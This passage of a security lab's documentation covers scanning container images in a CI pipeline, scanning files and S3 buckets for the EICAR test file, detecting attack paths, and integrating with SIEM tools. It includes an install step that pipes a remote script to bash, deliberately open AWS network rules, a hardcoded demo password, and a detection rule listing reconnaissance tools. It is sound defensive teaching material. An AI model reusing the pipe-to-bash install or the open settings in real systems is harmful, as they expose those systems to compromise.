registry.</p> <p>The logic implemented in this Action template is as follows:</p> <ul> <li>Prepare the Docker Buildx environment.</li> <li>Build the image and save it as a tar ball.</li> <li>Scan the built image for vulnerabilities and malware using Vision One Container Security.</li> <li>Upload Scan Result and SBOM Artifact if available. Artifacts allow you to share data between jobs in a workflow and store data once that workflow has completed, in this case saving the scan result and the container image SBOM as an artifact allow you to have proof on what happened on past scans.</li> <li>Optionally fail the workflow if malware and/or the vulnerability threshold was reached. Failing the workflow at this stage prevents the registry to get polluted with insecure images.</li> <li>Authenticate to the deployment registry.</li> <li>Rebuild the image from cache for the desired architectures.</li> <li>Push the image to the registry.</li> <li>Rescan the image in the registry to allow proper admission control integration.</li> </ul>"},{"location":"scenarios/as/tmas-github-action/#fork-the-scenario-repo","title":"Fork the Scenario Repo","text":"<p>The first step is to fork the scenarios GitHub repo. For this go to github.com and sign in or create a free account if you need to.</p> <p>Next, you want to create a Fork of the scenarios repo. A fork is basically a copy of a repository. Forking a repository allows you to freely experiment with changes without affecting the original project.</p> <p>To do this navigate to the repo playground-one-scenario-github-action and click on the <code>Fork</code>-button in the upper right.</p> <p>On the next screen you change the name to something shorter like <code>action</code>. Then press <code>[Create fork]</code> which will bring you back to your account.</p>"},{"location":"scenarios/as/tmas-github-action/#the-repo","title":"The Repo","text":"<p>The repo containes a very simple Dockerfile and a hidden directory <code>.github/workflows</code> with a <code>yaml</code>-file.</p> <p>The Dockerfile specifies the image to build. As we can easily see, it is using the latest <code>nginx</code> as the base image and just adds (very obviously) an Eicar.</p> <pre><code>FROM nginx\n\nRUN curl -fsSL http://eicar.eu/eicarcom2.zip -o /usr/share/nginx/html/eicarcom2.zip\n</code></pre>"},{"location":"scenarios/as/tmas-github-action/#the-workflow","title":"The Workflow","text":"<p>The <code>yaml</code>-file in <code>.github/workflows</code> is more interesting. Let's go through it.</p> <pre><code>name: ci\n\n# A push --tags on the repo triggers the workflow\non:\n  push:\n    tags: [ v* ]\n\nenv:\n  REGISTRY: ghcr.io\n  IMAGE_NAME: ${{ github.repository }}\n  TMAS_API_KEY: ${{ secrets.TMAS_API_KEY }}\n\n  REGION: us-east-1\n  THRESHOLD: \"critical\"\n  MALWARE_SCAN: true\n  FAIL_ACTION: true\n\njobs:\n  docker:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n\n    steps:\n      # Prepare the Docker Buildx environment.\n      - name: Checkout\n        uses: actions/checkout@v4\n      - name: Set up QEMU\n        uses: docker/setup-qemu-action@v3\n      - name: Set up Docker Buildx\n        uses: docker/setup-buildx-action@v3\n\n      - name: Extract metadata for the Docker image\n        id: meta\n        uses: docker/metadata-action@v5\n        with:\n          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}\n\n      # Build the image and save it as a tar ball.\n      - name: Build and store\n        uses: docker/build-push-action@v5\n        with:\n          context: .\n          tags: ${{ steps.meta.outputs.tags }}\n          outputs: type=docker,dest=/tmp/image.tar\n\n      # Scan the build image for vulnerabilities and malware.\n      - name: Scan\n        env:\n          SBOM: true # Saves SBOM to sbom.json\n        run: |\n          # Install tmas latest version\n          curl -s -L https://gist.github.com/raphabot/abae09b46c29afc7c3b918b7b8ec2a5c/raw/ | bash\n\n          tmas scan \"$(if [ \"$MALWARE_SCAN\" = true ]; then echo \"--malwareScan\"; fi)\" -r \"$REGION\" docker-archive:/tmp/image.tar \"$(if [ \"$SBOM\" = true ]; then echo \"--saveSBOM\"; fi)\" | tee result.json\n\n          if [ \"$SBOM\" = true ]; then mv SBOM_* sbom.json; fi\n\n          # Analyze result\n          fail_vul=false\n          fail_mal=false\n          [ \"${THRESHOLD}\" = \"any\" ] &amp;&amp; \\\n            [ $(jq '.vulnerability.totalVulnCount' result.json) -ne 0 ] &amp;&amp; fail_vul=true\n\n          [ \"${THRESHOLD}\" = \"critical\" ] &amp;&amp; \\\n            [ $(jq '.vulnerability.criticalCount' result.json) -ne 0 ] &amp;&amp; fail_vul=true\n\n          [ \"${THRESHOLD}\" = \"high\" ] &amp;&amp; \\\n            [ $(jq '.vulnerability.highCount + .vulnerability.criticalCount' result.json) -ne 0 ] &amp;&amp; fail_vul=true\n\n          [ \"${THRESHOLD}\" = \"medium\" ] &amp;&amp; \\\n            [ $(jq '.vulnerability.mediumCount + .vulnerability.highCount + .vulnerability.criticalCount' result.json) -ne 0 ] &amp;&amp; fail_vul=true\n\n          [ \"${THRESHOLD}\" = \"low\" ] &amp;&amp;\n            [ $(jq '.vulnerability.lowCount + .vulnerability.mediumCount + .vulnerability.highCount + .vulnerability.criticalCount' result.json) -ne 0 ] &amp;&amp; fail_vul=true\n\n          [ $(jq '.malware.scanResult' result.json) -ne 0 ] &amp;&amp; fail_mal=true\n\n          [ \"$fail_vul\" = true ] &amp;&amp; echo !!! Vulnerability threshold exceeded !!! &gt; vulnerabilities || true\n          [ \"$fail_mal\" = true ] &amp;&amp; echo !!! Malware found !!! &gt; malware || true\n\n      # Upload Scan Result and SBOM Artifact if available.\n      - name: Upload Scan Result Artifact\n        uses: actions/upload-artifact@v3\n        with:\n          name: scan-result\n          path: result.json\n          retention-days: 30\n\n      - name: Upload SBOM Artifact\n        uses: actions/upload-artifact@v3\n        with:\n          name: sbom\n          path: sbom.json\n          retention-days: 30\n\n      # Fail the workflow if malware found or the vulnerability threshold reached.\n      - name: Fail Action\n        run: |\n          if [ \"$FAIL_ACTION\" = true ]; then\n            if [ -f \"malware\" ]; then cat malware; fi\n            if [ -f \"vulnerabilities\" ]; then cat vulnerabilities; fi\n            if [ -f \"malware\" ] || [ -f \"vulnerabilities\" ]; then exit 1; fi\n          fi\n\n      # Login to the registry.\n      - name: Login to the Container registry\n        uses: docker/login-action@v3\n        with:\n          registry: ${{ env.REGISTRY }}\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}\n\n      # Rebuild the image and push to registry. This is fast since everything is cached.\n      - name: Build and push\n        id: build\n        uses: docker/build-push-action@v5\n        with:\n          context: .\n          push: true\n          provenance: false\n          tags: ${{ steps.meta.outputs.tags }}\n\n      - name: Summarize the Docker digest and tags\n        run: |\n          echo 'Digest: ${{ steps.build.outputs.digest }}'\n          echo 'Tags: ${{ steps.meta.outputs.tags }}'\n\n      # Rescan in the registry to support admission control\n      - name: Registry Scan\n        run: |\n          tmas scan \"$(if [ \"$MALWARE_SCAN\" = true ]; then echo \"--malwareScan\"; fi)\" -r \"$REGION\" -p linux/amd64 registry:${{ steps.meta.outputs.tags }} || true\n</code></pre>"},{"location":"scenarios/as/tmas-github-action/#secrets","title":"Secrets","text":"<p>The workflow requires a secret to be set. For that navigate to <code>Settings --&gt; Security --&gt; Secrets and variables --&gt; Actions --&gt; Secrets</code>.</p> <p>Add the following secret:</p> <ul> <li>TMAS_API_KEY: <code>&lt;Your TMAS API Key&gt;</code></li> </ul>"},{"location":"scenarios/as/tmas-github-action/#template","title":"Template","text":"<p>Below, the workflow tamplate. Adapt it to your needs and save it as a <code>yaml</code>-file in the <code>.github/workflow</code> directory.</p> <p>Adapt the environment variables in the <code>env:</code>-section as required.</p> Variable Purpose <code>REGISTRY</code> The workflow uses the GitHub Packages by default. <code>IMAGE_NAME</code> The image name is derived from the GitHub Repo name. <code>TMAS_API_KEY</code> The key is retrieved from the secrets. <code>REGION</code> Vision One Region of choice (ap-southeast-2, eu-central-1, ap-south-1, ap-northeast-1, ap-southeast-1, us-east-1). <code>THRESHOLD</code> Defines the fail condition of the action in relation to discovered vulnerabilities. A threshold of <code>critical</code> does allow any number of vulnerabilities up to the criticality <code>high</code>. <code>MALWARE_SCAN</code> Enable or disable malware scanning. <code>FAIL_ACTION</code> Enable or disable failing the action if the vulnerability threshold was reached and/or malware detected. <p>Allowed values for the <code>THRESHOLD</code> are:</p> <ul> <li><code>any</code>: No vulnerabilities allowed.</li> <li><code>critical</code>: Max severity of discovered vulnerabilities is <code>high</code>.</li> <li><code>high</code>: Max severity of discovered vulnerabilities is <code>medium</code>.</li> <li><code>medium</code>: Max severity of discovered vulnerabilities is <code>low</code>.</li> <li><code>low</code>: Max severity of discovered vulnerabilities is <code>negligible</code>.</li> </ul> <p>If the <code>THRESHOLD</code> is not set, vulnerabilities will not fail the pipeline.</p> <p>The workflow will trigger on <code>git push --tags</code>.</p>"},{"location":"scenarios/as/tmas-github-action/#actions","title":"Actions","text":"<p>Navigate to <code>Actions</code> and enable Workflows for the forked repository.</p>"},{"location":"scenarios/as/tmas-github-action/#test-it","title":"Test it","text":""},{"location":"scenarios/as/tmas-github-action/#create-a-tag","title":"Create a Tag","text":"<p>To trigger the action we simply create a tag.</p> <p>Navigate to <code>Releases</code> on the right and then click on <code>[Draft a new release]</code>.</p> <p>Next, click on <code>[Choose a tag]</code> and type <code>v0.1</code>. A new button called <code>[Create new tag]</code> should get visible. Click on it.</p> <p>Leave the rest as it is and finally click on the green button <code>[Publish release]</code>. This will trigger the action workflow.</p> <p>CLI: <code>git tag v0.1 &amp;&amp; git push --tags</code></p>"},{"location":"scenarios/as/tmas-github-action/#check-the-action","title":"Check the Action","text":"<p>Now, navigate to the tab <code>Actions</code> and review the actions output. Click on the workflow run.</p> <p>You should now see three main sections:</p> <ol> <li><code>build-push.yaml</code>: Clicking on <code>docker</code> reveals the output of the steps from the workflow (and where it failed).    </li> <li>Annotations: Telling you in this case that the process completed with exit code 1.</li> <li>Artifacts: These are the artifacts created by the action. There should be a <code>sbom</code> and <code>scan-result</code>.</li> </ol>"},{"location":"scenarios/as/tmas-github-action/#let-the-workflow-pass","title":"Let the workflow pass...","text":"<p>Now, we want the image to be published, even though that it has vulnerabilities and a malware inside. To achieve this in this scenario we simply change the environment variable <code>FAIL_ACTION</code>:</p> <pre><code>env:\n...\n  FAIL_ACTION: false\n</code></pre> <p>Again, do this by directly editing the workflow file on GitHub and commit the changes to main. Then, repeat the steps to create a new tag as above, but choose a different tag (e.g. <code>v0.2</code>).</p> <p>The action should now complete successfully and the container image is pushed to the registry.</p>"},{"location":"scenarios/as/tmas-github-action/#configure-vision-one-container-protection-policy","title":"Configure Vision One Container Protection Policy","text":"<p>Next, ensure to have your Container Security policy set with the following properties:</p> <p></p>"},{"location":"scenarios/as/tmas-github-action/#try-deployment","title":"Try deployment","text":"<p>Assuming you have access to a Kubernetes cluster with Vision One Container Security deployed and a policy assigned with the setting from above, you can now run</p> <pre><code>kubectl run --image=ghcr.io/&lt;GITHUB_USERNAME&gt;/&lt;GITHUB_REPO_NAME&gt;:&lt;IMAGE_TAG&gt; action\n</code></pre> <p>This should result in the following error message since Container Security blocks the deploament:</p> <pre><code>Error from server: admission webhook \"trendmicro-admission-controller.trendmicro-system.svc\" denied the request: \n- malware violates rule with properties { count:0 } in container(s) \"nginx\" (block).\n- vulnerabilities violates rule with properties { max-severity:high } in container(s) \"nginx\" (block).\n</code></pre> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/as/tmfs-artifact-scanning/","title":"Scenario: File Malware Scanning","text":""},{"location":"scenarios/as/tmfs-artifact-scanning/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One Cloud Security File Scanner API-Key with the following permissions:<ul> <li>Cloud Security Operations<ul> <li>File Security<ul> <li>Run file scan via SDK</li> </ul> </li> </ul> </li> </ul> </li> </ul> <p>Ensure to have the latest <code>tmfs</code> deployed:</p> <pre><code>tmcli-update\n</code></pre>"},{"location":"scenarios/as/tmfs-artifact-scanning/#scan-images","title":"Scan Images","text":"<p>First, set the Artifact Scanner API-Key as an environment variable:</p> <pre><code>export TMFS_API_KEY=&lt;YOUR API-Key&gt;\n</code></pre> <p>Note: tmfs defaults to the Vision One service region <code>us-east-1</code>. If your Vision One is serviced from any other region you need to add the <code>--region</code> flag to the scan request.</p> <p>Valid regions: <code>[ap-southeast-2 eu-central-1 ap-south-1 ap-northeast-1 ap-southeast-1 us-east-1]</code></p> <p>To easily scan an image for vulnerabililies run</p> <pre><code># Service region us-east-1, scan directory\ntmfs scan dir:path/to/yourproject\n\n# Service region us-east-1, scan single file\ntmfs scan file:path/to/yourproject/file\n\n# Service region eu-central-1, scan single file\ntmfs scan file:path/to/yourproject/file --region eu-central-1\n</code></pre> <p>Example output for <code>tmfs scan file:./eicar.zip | jq .</code>:</p> <pre><code>{\n  \"scannerVersion\": \"1.0.0-631\",\n  \"schemaVersion\": \"1.0.0\",\n  \"scanResult\": 1,\n  \"scanId\": \"72c04b72-0e5b-45b4-a460-6c4346beec5e\",\n  \"scanTimestamp\": \"2023-12-20T11:44:30.526Z\",\n  \"fileName\": \"./eicar.zip\",\n  \"foundMalwares\": [\n    {\n      \"fileName\": \"./eicar.zip\",\n      \"malwareName\": \"OSX_EICAR.PFH\"\n    }\n  ],\n  \"fileSHA1\": \"d27265074c9eac2e2122ed69294dbc4d7cce9141\",\n  \"fileSHA256\": \"2546dcffc5ad854d4ddc64fbf056871cd5a00f2471cb7a5bfd4ac23b6e9eedad\"\n}\n</code></pre> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/as/tmfs-s3-bucket-scanning/","title":"Scenario: S3 Bucket Malware Scanning","text":""},{"location":"scenarios/as/tmfs-s3-bucket-scanning/#prerequisites","title":"Prerequisites","text":"<ul> <li>Vision One Cloud Security File Scanner API-Key with the following permissions:<ul> <li>Cloud Security Operations<ul> <li>File Security<ul> <li>Run file scan via SDK</li> </ul> </li> </ul> </li> </ul> </li> <li>Know your Vision One region.</li> </ul> <p>Note: This scenario uses Playground Ones own S3 Bucket Scanner which is not the official solution component of Vision One. It uses the File Security Python SDK within a Lambda Function. Scan results will show up on the Vision One console.</p>"},{"location":"scenarios/as/tmfs-s3-bucket-scanning/#limitations","title":"Limitations","text":"<ul> <li>Maximum file size 1GB</li> <li>The scanned files are neither tagged nor quarantined, just scanned.</li> </ul>"},{"location":"scenarios/as/tmfs-s3-bucket-scanning/#architecture","title":"Architecture","text":"<p>The scanner consists out of the following components:</p> <ul> <li>A Lambda function triggered by <code>s3:ObjectCreated</code> events. It uses the File Security Python SDK via gRPC.</li> <li>An S3 Bucket with the permission to notify the Lambda</li> <li>An IAM Role and Policy</li> </ul> <p>Note: Lambda will use Python 3.11</p>"},{"location":"scenarios/as/tmfs-s3-bucket-scanning/#the-function-code","title":"The Function Code","text":"<p>Below are the relevant sections of the function code:</p> <pre><code>import boto3\nimport json\nimport os\nimport urllib.parse\n\nimport amaas.grpc\n\nv1_region = os.getenv(\"TM_V1_REGION\")\nv1_amaas_key = os.getenv(\"TM_AM_AUTH_KEY\")\n\n\ndef lambda_handler(event, context):\n\n  handle = amaas.grpc.init_by_region(v1_region, v1_amaas_key, True)\n\n  for record in event[\"Records\"]:\n\n    bucket = record[\"s3\"][\"bucket\"][\"name\"]\n    key = urllib.parse.unquote_plus(record[\"s3\"][\"object\"][\"key\"], encoding=\"utf-8\")\n\n    try:\n      s3 = boto3.resource(\"s3\")\n      s3object = s3.Object(bucket, key)\n      buffer = s3object.get().get(\"Body\").read()\n      scan_resp = amaas.grpc.scan_buffer(handle, buffer, key, [\"pgo\"])\n      scan_result = json.loads(scan_resp)\n      print(f\"scanResult -&gt; {str(scan_result)}\")\n\n      # Interprete scanResult if tagging or quarantining should be done\n\n    except Exception as e:\n      print(e)\n      print(\"Error scan object {} from bucket {}.\".format(key, bucket))\n\n  amaas.grpc.quit(handle)\n</code></pre>"},{"location":"scenarios/as/tmfs-s3-bucket-scanning/#deployment","title":"Deployment","text":"<p>Assuming you have set your Vision One API Key and Vision One region with the help of the config tool simply run</p> <pre><code>pgo --apply s3scanner\n</code></pre> <p>The following outputs are created:</p> <pre><code>Outputs:\n\naws_lambda_function_name = \"pgo-dev-bucket-scanner-v0ui7ows\"\naws_s3_bucket_name = \"pgo-dev-scanning-bucket-v0ui7ows\"\n</code></pre> <p>Feel free to review the Lambda function in the AWS console.</p>"},{"location":"scenarios/as/tmfs-s3-bucket-scanning/#run-scans","title":"Run Scans","text":"<p>Either head over to the S3 bucket via the console to upload files or use the AWS cli.</p> <p>Download the <code>eicarcom2.zip</code> and upload it to the scanning bucket.</p> <p>Warning: Do not download malicious files on computers with a running anti malware engine!</p> <pre><code># Set your bucket name from the outputs\nSCANNING_BUCKET=pgo-dev-scanning-bucket-v0ui7ows\n\nwget https://secure.eicar.org/eicarcom2.zip\naws s3 cp eicarcom2.zip s3://${SCANNING_BUCKET}/eicarcom2.zip\n</code></pre>"},{"location":"scenarios/as/tmfs-s3-bucket-scanning/#check-on-vision-one","title":"Check on Vision One","text":"<p>When heading over to your Vision One console to <code>Cloud Security Operations --&gt; File Security</code> you should see scan results with potentially detected malware.</p> <p></p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/asrm/iam-user-attack-path/","title":"Scenario: ASRM to detect Potential Attack Path to RDS via IAM User","text":"<p>DRAFT</p>"},{"location":"scenarios/asrm/iam-user-attack-path/#prerequisites","title":"Prerequisites","text":"<ul> <li>AWS Cloud Account integrated with Vision One</li> </ul> <p>Ensure to have the Playground One Network up and running:</p> <pre><code># Network configuration\npgo --apply network\n</code></pre>"},{"location":"scenarios/asrm/iam-user-attack-path/#setup","title":"Setup","text":"<p>The Playground One configuration for EC2 (<code>ec2</code> or <code>instances</code>) can create an IAM User and IAM User Group with RDS Full Access and some EC2 action permissions when the creation of Potential Attack Path(s) is enabled in the config tool. The one of interest is the user <code>dbadmin</code> within the group dbadmins.</p> <p>Verify, that you have <code>Vision One ASRM - create Potential Attack Path(s)</code> enabled in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nVision One ASRM - create Potential Attack Path(s) [true]:\n...\n</code></pre> <pre><code># With Potential Attack Path enabled\npgo --apply instances\n</code></pre> <p>The IAM User is detected by Vision One ASRM after some time when you configured your CAM stack properly. The full analysis which should lead to a potential attack path as seen in the below screenshot can take up to 48hs.</p> <p></p> <p>Below the Asset Graph of the high risk instance:</p> <p></p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/asrm/iam-user-attack-path/#tear-down","title":"Tear Down","text":"<p>At minimum, disable <code>Vision One ASRM - create Potential Attack Path(s)</code> in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nVision One ASRM - create Potential Attack Path(s) [true]: false\n...\n</code></pre> <pre><code>pgo --apply instances\n</code></pre>"},{"location":"scenarios/asrm/virtual-machine-attack-path/","title":"Scenario: ASRM to detect Potential Attack Path to RDS via EC2","text":""},{"location":"scenarios/asrm/virtual-machine-attack-path/#prerequisites","title":"Prerequisites","text":"<ul> <li>AWS Cloud Account integrated with Vision One</li> </ul> <p>Insecure Configuration</p> <p>Playing through this scenario requires the Playground One to be configured insecurely. This is because one of the AWS EC2 Security Groups will be configured to <code>0.0.0.0/0</code> inbound rules. Depending on the governance restrictions you need to comply with you might receive a (friendly) notification. </p> <p>Ensure to have the Playground One Network up and running:</p> <pre><code># Network configuration\npgo --apply network\n</code></pre>"},{"location":"scenarios/asrm/virtual-machine-attack-path/#setup","title":"Setup","text":"<p>The Playground One configuration for EC2 (<code>ec2</code> or <code>instances</code>) creates two Linux servers when enabled in the config tool. The one of interest is the <code>db1</code> instance since it get's an instance profile assigned which allows read access to RDS. Contrary to all other instances this instance will use a dedicated security group which is open to the internet using the CIDR block <code>0.0.0.0/0</code>.</p> <p>Verify, that you have <code>EC2 - create Linux EC2</code>, <code>EC2 - create RDS Database</code> and <code>Vision One ASRM - create Potential Attack Path(s)</code> enabled in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nEC2 - create Linux EC2 [true]:\n...\nEC2 - create RDS Database [true]: \n...\nVision One ASRM - create Potential Attack Path(s) [true]:\n...\n</code></pre> <p>A (free-tier) PostgreSQL dabase is automatically created when applying the configuration. It is not actively used but required to have a target in the potential attack path.</p> <pre><code># With Potential Attack Path enabled\npgo --apply network\n\n# With Linux machines enabled\npgo --apply instances\n</code></pre> <p>The Linux instances are detected by Vision One ASRM after some time when you configured your CAM stack properly. The full analysis which should lead to a potential attack path for the <code>db1</code> instance as seen in the below screenshot can take up to 48hs.</p> <p></p> <p>As we can see, there is a high risk EC2 instance listed with a risk score of 72. Following the link of <code>i-0726e545c73222cbf</code> will explain us the cause of the risk rating. The instance is detected as an Internet-facing EC2 instance with unrestricted Access.</p> <p>Additionally, the full potential attack path is shown in the lower half of the screen. It shows that one might be able to reach out to an RDS instance due to the assigned IAM instance role.</p> <p></p> <p>Navigating to the tab <code>Asset Risk Graph</code> creates a graphical representaion on the currently inspected asset. The instance of interest is the in grey highlighted one. On it's right the EC2 instance role granting database access is shown.</p> <p>One can easily review the all the dependencies of this instance such as who can access the instance and why, the assigned security group and mounted volumes.</p> <p></p> <p>The Asset Profile presents detailed information about the asset such as Region, Availability zone, VPC ID, Public IP, architecture, and tags. Based on the analyses of Vision One, this instance is of Medium criticality. Depending on it's business relevance this could be easily adapted, if required.</p> <p></p> <p>Going back to <code>Attack Surface Discovery --&gt; Cloud Assets</code> followed by enabling the <code>Cloud Risk Graph</code> in the top right we can use the region view, in this case <code>eu-central-1</code> to let Vision One visually present us a high level view on what is deployed in the region of interest. The highlighted subnet <code>subnet-03930b609d1dbc4cd</code> indicates that an EC2 with a high risk score of 72 exists in it.</p> <p></p> <p>\ud83c\udf89 Success \ud83c\udf89</p>"},{"location":"scenarios/asrm/virtual-machine-attack-path/#tear-down","title":"Tear Down","text":"<p>At minimum, disable <code>Vision One ASRM - create Potential Attack Path(s)</code> in your configuration.</p> <pre><code>pgo --config\n</code></pre> <pre><code>...\nVision One ASRM - create Potential Attack Path(s) [true]: false\n...\n</code></pre> <pre><code>pgo --apply network\n</code></pre>"},{"location":"scenarios/bigdata/elastic-stack-vision-one/","title":"Integrate Elastic Stack with Vision One","text":"<p>DRAFT</p> <p>Challenge ahead!</p> <p>This scenario is a bit challenging, but you should be able to get through it easily.</p>"},{"location":"scenarios/bigdata/elastic-stack-vision-one/#prerequisites","title":"Prerequisites","text":"<ul> <li>Docker Engine with Compose enabled</li> <li>Completed Scenario Elastic Setup</li> </ul>"},{"location":"scenarios/bigdata/elastic-stack-vision-one/#connect-the-trend-vision-one-for-elastic-app-to-vision-one","title":"Connect the Trend Vision One for Elastic App to Vision One","text":"<p>The App will pull data from Vision One. To allow this we need to head over to Vision One and create an API Key for your Elastic instance.</p> <p>In Vision One head over to <code>Workflow and Automation -&gt; Third-Party Ingegration</code> and filter for <code>Elastic</code> in the vendors section. This should filter on four available integration variants. Choose <code>Elastic</code> in this case.</p> <p></p> <p>Click on <code>[Generate]</code> and in the <code>Add API Key</code>-dialog on <code>[Add]</code>.</p> <p>Save the generated API Key in a secure location.</p> <p>Next, go back to your Kibana and navigate to <code>Management -&gt; Integrations</code> and find <code>Trend Micro Vision One</code>.</p> <p></p> <p>Click on the Integration.</p> <p></p> <p>Install the integration by clicking on the blue button <code>[Add Trend Micro Vision One]</code></p> <p></p> <p>Go through the settings and set URL und API Token. Leave everything to the defaults.</p> <p>As URL type <code>https://api.xdr.trendmicro.com</code> for an US instance of Vision One. Adapt the URL if your instance is located in another region (see FAQ).</p> <p></p> <p>Click on the button <code>[Save and continue]</code> in the bottom right.</p> <p>To be continued...</p>"},{"location":"scenarios/bigdata/elastic-stack-vision-one/#links","title":"Links","text":"<ul> <li>Integration: https://docs.elastic.co/integrations/trend_micro_vision_one</li> </ul>"},{"location":"scenarios/bigdata/elastic-stack/","title":"Get the Elastic Stack (ELK) Up and Running Locally","text":"<p>DRAFT</p> <p>Challenge ahead!</p> <p>This scenario is a bit challenging, but you should be able to get through it easily.</p>"},{"location":"scenarios/bigdata/elastic-stack/#prerequisites","title":"Prerequisites","text":"<ul> <li>Docker Engine with Compose enabled</li> <li>The host needs at least 8GB RAM available</li> </ul>"},{"location":"scenarios/bigdata/elastic-stack/#install-compose-if-required","title":"Install Compose (if required)","text":"<p>Use the following command to download:</p> <pre><code>mkdir -p ~/.docker/cli-plugins/\ncurl -SL https://github.com/docker/compose/releases/download/v2.3.3/docker-compose-linux-x86_64 -o ~/.docker/cli-plugins/docker-compose\n</code></pre> <p>Next, set the correct permissions so that the docker compose command is executable:</p> <pre><code>chmod +x ~/.docker/cli-plugins/docker-compose\n</code></pre> <p>To verify that the installation was successful, you can run:</p> <pre><code>docker compose version\n</code></pre> <p>You\u2019ll see output similar to this:</p> <pre><code>Output\nDocker Compose version v2.3.3\n</code></pre> <p>Docker Compose is now successfully installed on your system. In the next section, you\u2019ll see how to set up a <code>docker-compose.yaml</code> file and get a containerized environment up and running with this tool.</p>"},{"location":"scenarios/bigdata/elastic-stack/#start-your-elk-stack","title":"Start your ELK-Stack","text":"<p>First, change to the working directory.</p> <pre><code># Change to working directory\ncd ${ONEPATH}/stacks/elastic\n</code></pre> <p>Feel free to review the files, especially the <code>docker-compose.yaml</code> which creates the stack.</p> <p>Now run</p> <pre><code>docker compose up\n</code></pre> <p>The first startup requires some minutes to complete.</p> <p>Optionally, check the certificate for your stack:</p> <pre><code>docker cp elastic-es01-1:/usr/share/elasticsearch/config/certs/ca/ca.crt /tmp/.\n\ncurl --cacert /tmp/ca.crt -u elastic:TrendMicro.1 https://localhost:9200\n</code></pre> <p>This should return something similar like this:</p> <pre><code>{\n  \"name\" : \"es01\",\n  \"cluster_name\" : \"docker-cluster\",\n  \"cluster_uuid\" : \"wmp-Yz-WQPq4_kfzzyo8wg\",\n  \"version\" : {\n    \"number\" : \"8.13.4\",\n    \"build_flavor\" : \"default\",\n    \"build_type\" : \"docker\",\n    \"build_hash\" : \"da95df118650b55a500dcc181889ac35c6d8da7c\",\n    \"build_date\" : \"2024-05-06T22:04:45.107454559Z\",\n    \"build_snapshot\" : false,\n    \"lucene_version\" : \"9.10.0\",\n    \"minimum_wire_compatibility_version\" : \"7.17.0\",\n    \"minimum_index_compatibility_version\" : \"7.0.0\"\n  },\n  \"tagline\" : \"You Know, for Search\"\n}\n</code></pre> <p>Try to access your Kibana instance, the main UI of your Elastic Stack, at http://localhost:5601 and use the following credentials:</p> <ul> <li>Username: <code>elastic</code></li> <li>Password: <code>TrendMicro.1</code></li> </ul> <p>Within Kibana, open the navigation (top left) and head over to <code>Management -&gt; Stack Monitoring</code>. There should be a dialog popping up to create <code>Out-of-the box rules</code>. Do it.</p> <p></p> <p>Detached Mode</p> <p>If you want to run the stack continuously restart the stack but append <code>-d</code> to activate detached mode.</p> <p><code>docker compose up -d</code></p>"},{"location":"scenarios/bigdata/elastic-stack/#tear-down-elastic","title":"Tear Down Elastic","text":"<p>If you at some point want to delete your ELK Stack instance run the following command:</p> <pre><code>docker compose down -v\n</code></pre> <p>This will remove all containers, volumes, and the network.</p>"},{"location":"scenarios/bigdata/splunk-integrate-vision-one-custom-rules/","title":"Integrate V1CS Customer Runtime Security Rules with Splunk","text":"<p>DRAFT</p> <p>Challenge ahead!</p> <p>This scenario is a bit challenging, but you should be able to get through it easily.</p>"},{"location":"scenarios/bigdata/splunk-integrate-vision-one-custom-rules/#prerequisites","title":"Prerequisites","text":"<ul> <li>Docker Engine with Compose enabled</li> <li>Completed Scenario Splunk Setup</li> </ul>"},{"location":"scenarios/bigdata/splunk-integrate-vision-one-custom-rules/#configure-http-event-collector-in-splunk","title":"Configure HTTP Event Collector in Splunk","text":"<p>Beeing authenticated to Splunk navigate to <code>Settings -&gt; Data -&gt; Data inputs</code> and create a new <code>HTTP Event Collector</code> by clicking <code>[+ Add new]</code> on the right hand side.</p> <p></p> <p></p> <p>Create a <code>V1CS Custom Rule Events</code></p> <p></p> <p>Click <code>[Next]</code>, which you will bring to the <code>Input Settings</code>.</p> <p></p> <p>On the this page we will create a new indexer first. To do so, click on <code>Create a new index</code>.</p> <p></p> <p>Name it <code>v1cs_custom_rule_events</code>, and change App to <code>Splunk Analytics Workspace</code>. </p> <p></p> <p>Leave all the rest as default and click <code>[Save]</code>.</p> <p>Back at the Input Settings, move the newly created index to the right by clicking on it.</p> <p></p> <p>Proceed with <code>[Review &gt;]</code> in the upper right.</p> <p>Proceed with <code>[Submit &gt;]</code> in the upper right.</p> <p></p> <p>You now want to copy the <code>Token Value</code> and paste it to your notes.</p> <p>The <code>Token Value</code> is also shown on <code>Settings -&gt; Data -&gt; Data inputs</code>, select <code>HTTP Event Collector</code> which shows our just created collector and the <code>Token Value</code>.</p> <p></p> <p>Btw, you need to know the IP address of your docker host later.</p>"},{"location":"scenarios/bigdata/splunk-integrate-vision-one-custom-rules/#integrate-custom-rules-to-v1cs","title":"Integrate Custom Rules to V1CS","text":"<p>Custom Rules for Vision One Container Security do work with any kind of the provided Kubernetes clusters (EKS with EC2 or Fargate, or Kind).</p> <p>Below, how to do this using the built in Kind cluster:</p> <p>Prerequisite: Vision One Container Security configured in Playground One configuration.</p> <pre><code>pgo --init kind\npgo --apply kind\n</code></pre> <p>The above will create the cluster and deploy Container Security.</p> <p>Next, run the following commands in your shell:</p> <pre><code># Create and change to working directory\nmkdir -p ${ONEPATH}/customrules\ncd ${ONEPATH}/customrules\n\n# Download helm release\ntag=2.3.38\ncurl -LOs https://github.com/trendmicro/cloudone-container-security-helm/archive/refs/tags/${tag}.tar.gz\ntar xfz ${tag}.tar.gz\n\n# Navigate to the customrules directory\ncd cloudone-container-security-helm-${tag}/config/customrules\n</code></pre> <p>Next, we're creating a sample custom rule. Do this by running the following command:</p> <pre><code>cat &lt;&lt;EOF &gt;./playground_rules.yaml\n# ################################################################################\n# Information Gathering\n# ################################################################################\n- macro: container\n  condition: (container.id != host)\n\n# We create an event, if someone runs an information gathering tool within a container\n- list: information_gathering_tools\n  items:\n    [\n      whoami,\n      nmap,\n      racoon,\n      ip,\n    ]\n\n- rule: (PG-IG) Information gathering detected\n  desc: An information gathering tool is run in a Container\n  condition: evt.type 